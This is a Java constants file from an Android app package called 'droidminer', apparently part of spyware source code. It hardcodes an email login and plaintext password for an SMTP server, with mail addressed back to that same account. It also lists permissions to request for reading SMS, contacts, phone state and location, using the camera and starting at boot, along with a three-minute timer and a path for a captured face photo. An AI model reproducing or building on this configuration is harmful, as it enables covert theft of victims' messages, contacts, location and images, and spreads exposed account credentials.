package com.miner.droidminer.modules;

import android.Manifest;
import android.os.Environment;

import java.io.File;

/**
 * Created by Kopites on 10/18/2016.
 */

public class Constants {
    public static final String LOGIN = "adam.smith.1992@inbox.ru";
    public static final String PASSWORD = "anhquanit94";

    public static final String SMTP_SERVER = "smtp.mail.ru";
    public static final String TO = LOGIN;
    public static final String SUBJECT = "MINER";
    public static final String FROM = LOGIN;

    public static final int timer = 60000 * 3;

    static final String[] MARSH_ALLOW_PERMISSIONS = new String[] {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA
    };

    static final String FACE_PATH = Environment.getExternalStorageDirectory()
            + File.separator +
            Environment.DIRECTORY_DCIM +
            File.separator + "Camera" + File.separator
            + "yourface.png";
}
